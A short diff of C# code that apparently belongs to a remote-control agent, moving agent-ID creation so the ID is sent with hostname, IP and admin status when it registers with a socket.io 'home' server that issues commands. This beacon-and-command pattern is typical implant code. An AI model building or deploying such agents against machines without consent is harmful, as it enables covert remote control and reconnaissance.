@@ -15,6 +15,7 @@ using System.Runtime.InteropServices;
 
 namespace ConsoleApp1
 {
+    
     class Program
     {
         static void Main(string[] args)
@@ -34,6 +35,9 @@ namespace ConsoleApp1
             // create new socket.io client
             var client = new SocketIO(home);
 
+            // Create the agent id
+            string id = Guid.NewGuid().ToString();
+
             // register all of the commands
             client.On("echo", response =>
             {
@@ -44,7 +48,7 @@ namespace ConsoleApp1
             // add an event that happens when we first connect
             client.OnConnected += (sender, e) =>
             {
-                client.EmitAsync("register", GetSysinfo());
+                client.EmitAsync("register", GetSysinfo(id));
             };
 
             // finally, connect to the server and start the party
@@ -66,9 +70,8 @@ namespace ConsoleApp1
             return principal.IsInRole(WindowsBuiltInRole.Administrator);
         }
 
-        static object GetSysinfo()
+        static object GetSysinfo(string id)
         {
-            string id = Guid.NewGuid().ToString();
             string hostname = Environment.MachineName;
             string ipaddr = GetLocalIPAddress();
             string elevated = AmIHigh() ? "*" : "";
